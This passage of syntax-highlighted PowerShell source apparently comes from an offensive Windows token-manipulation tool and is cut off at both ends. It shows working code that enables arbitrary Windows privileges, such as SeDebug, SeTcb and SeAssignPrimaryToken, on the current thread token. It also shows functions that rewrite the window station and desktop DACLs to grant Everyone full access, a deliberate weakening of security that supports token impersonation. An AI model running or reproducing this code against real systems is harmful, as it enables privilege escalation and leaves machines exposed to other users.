        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token namespace">[Bool]</span><span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>
        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_NO_TOKEN<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$Result</span> = <span class="token variable">$ImpersonateSelf</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SECURITY_DELEGATION<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
                <span class="token punctuation">}</span>

                <span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token namespace">[ComponentModel.Win32Exception]</span> <span class="token variable">$ErrorCode</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

        <span class="token variable">$LuidSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidSize</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidObject</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>
        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">)</span>

        <span class="token variable">$Result</span> = <span class="token variable">$LookupPrivilegeValue</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token string">"SeAssignPrimaryTokenPrivilege"</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$LuidObject</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token namespace">[UInt32]</span><span class="token variable">$LuidAndAttributesSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidAndAttributesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesSize</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidAndAttributes</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>
        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">)</span>

        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Luid = <span class="token variable">$LuidObject</span>
        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Attributes = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED

        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenPrivSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenPrivilegesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivSize</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>
        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>PrivilegeCount = 1
        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>Privileges = <span class="token variable">$LuidAndAttributes</span>

        <span class="token variable">$Global</span>:TokenPriv = <span class="token variable">$TokenPrivileges</span>

        <span class="token variable">$Result</span> = <span class="token variable">$AdjustTokenPrivileges</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$TokenPrivileges</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivSize</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Enable SeSecurityPrivilege, needed to query security information for desktop DACL</span>
    <span class="token keyword">function</span> Enable<span class="token operator">-</span>Privilege
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter()]</span>
            <span class="token punctuation">[</span>ValidateSet<span class="token punctuation">(</span><span class="token string">"SeAssignPrimaryTokenPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeAuditPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeBackupPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeChangeNotifyPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreateGlobalPrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeCreatePagefilePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreatePermanentPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreateSymbolicLinkPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeCreateTokenPrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeDebugPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeEnableDelegationPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeImpersonatePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeIncreaseBasePriorityPrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeIncreaseQuotaPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeIncreaseWorkingSetPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeLoadDriverPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeLockMemoryPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeMachineAccountPrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeManageVolumePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeProfileSingleProcessPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeRelabelPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeRemoteShutdownPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeRestorePrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeSecurityPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeShutdownPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeSyncAgentPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeSystemEnvironmentPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeSystemProfilePrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeSystemtimePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTakeOwnershipPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTcbPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTimeZonePrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeTrustedCredManAccessPrivilege"</span><span class="token punctuation">,</span>
                <span class="token string">"SeUndockPrivilege"</span><span class="token punctuation">,</span> <span class="token string">"SeUnsolicitedInputPrivilege"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            <span class="token namespace">[String]</span>
            <span class="token variable">$Privilege</span>
        <span class="token punctuation">)</span>

        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadHandle</span> = <span class="token variable">$GetCurrentThread</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token string">"Unable to get the handle to the current thread"</span>
        <span class="token punctuation">}</span>

        <span class="token namespace">[IntPtr]</span><span class="token variable">$ThreadToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token namespace">[Bool]</span><span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>
        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_NO_TOKEN<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$Result</span> = <span class="token variable">$ImpersonateSelf</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SECURITY_DELEGATION<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
                <span class="token punctuation">}</span>

                <span class="token variable">$Result</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token namespace">[ComponentModel.Win32Exception]</span> <span class="token variable">$ErrorCode</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadHandle</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

        <span class="token variable">$LuidSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidSize</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidObject</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span>
        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">)</span>

        <span class="token variable">$Result</span> = <span class="token variable">$LookupPrivilegeValue</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$Privilege</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$LuidObject</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token namespace">[UInt32]</span><span class="token variable">$LuidAndAttributesSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidAndAttributesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesSize</span><span class="token punctuation">)</span>
        <span class="token variable">$LuidAndAttributes</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>
        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributesPtr</span><span class="token punctuation">)</span>

        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Luid = <span class="token variable">$LuidObject</span>
        <span class="token variable">$LuidAndAttributes</span><span class="token punctuation">.</span>Attributes = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED

        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenPrivSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenPrivilegesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivSize</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>
        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>PrivilegeCount = 1
        <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>Privileges = <span class="token variable">$LuidAndAttributes</span>

        <span class="token variable">$Global</span>:TokenPriv = <span class="token variable">$TokenPrivileges</span>

        <span class="token function">Write-Verbose</span> <span class="token string">"Attempting to enable privilege: <span class="token variable">$Privilege</span>"</span>
        <span class="token variable">$Result</span> = <span class="token variable">$AdjustTokenPrivileges</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span> <span class="token variable">$TokenPrivileges</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivSize</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Result</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ThreadToken</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
        <span class="token function">Write-Verbose</span> <span class="token string">"Enabled privilege: <span class="token variable">$Privilege</span>"</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Change the ACL of the WindowStation and Desktop</span>
    <span class="token keyword">function</span> <span class="token function">Set</span><span class="token operator">-</span>DesktopACLs
    <span class="token punctuation">{</span>
        Enable<span class="token operator">-</span>Privilege <span class="token operator">-</span>Privilege SeSecurityPrivilege

        <span class="token comment" spellcheck="true">#Change the privilege for the current window station to allow full privilege for all users</span>
        <span class="token variable">$WindowStationStr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StringToHGlobalUni<span class="token punctuation">(</span><span class="token string">"WinSta0"</span><span class="token punctuation">)</span>
        <span class="token variable">$hWinsta</span> = <span class="token variable">$OpenWindowStationW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$WindowStationStr</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ACCESS_SYSTEM_SECURITY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>READ_CONTROL <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>WRITE_DAC<span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hWinsta</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token function">Set</span><span class="token operator">-</span>DesktopACLToAllowEveryone <span class="token operator">-</span>hObject <span class="token variable">$hWinsta</span>
        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hWinsta</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

        <span class="token comment" spellcheck="true">#Change the privilege for the current desktop to allow full privilege for all users</span>
        <span class="token variable">$hDesktop</span> = <span class="token variable">$OpenDesktopA</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token string">"default"</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>DESKTOP_GENERIC_ALL <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>WRITE_DAC<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hDesktop</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>

        <span class="token function">Set</span><span class="token operator">-</span>DesktopACLToAllowEveryone <span class="token operator">-</span>hObject <span class="token variable">$hDesktop</span>
        <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hDesktop</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> <span class="token function">Set</span><span class="token operator">-</span>DesktopACLToAllowEveryone
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[IntPtr]</span><span class="token variable">$hObject</span>
            <span class="token punctuation">)</span>

        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppSidOwner</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppsidGroup</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppDacl</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppSacl</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token namespace">[IntPtr]</span><span class="token variable">$ppSecurityDescriptor</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token comment" spellcheck="true">#0x7 is window station, change for other types</span>
        <span class="token variable">$retVal</span> = <span class="token variable">$GetSecurityInfo</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hObject</span><span class="token punctuation">,</span> 0x7<span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>DACL_SECURITY_INFORMATION<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSidOwner</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSidGroup</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppDacl</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSacl</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ppSecurityDescriptor</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$retVal</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Error</span> <span class="token string">"Unable to call GetSecurityInfo. ErrorCode: <span class="token variable">$retVal</span>"</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ppDacl</span> <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$AclObj</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ppDacl</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$ACL</span><span class="token punctuation">)</span>

            <span class="token comment" spellcheck="true">#Add all users to acl</span>
            <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 2000
            <span class="token variable">$pAllUsersSid</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
            <span class="token variable">$Success</span> = <span class="token variable">$CreateWellKnownSid</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>1<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$pAllUsersSid</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">Throw</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> ComponentModel<span class="token punctuation">.</span>Win32Exception<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">#For user "Everyone"</span>
            <span class="token variable">$TrusteeSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TRUSTEE</span><span class="token punctuation">)</span>
            <span class="token variable">$TrusteePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TrusteeSize</span><span class="token punctuation">)</span>
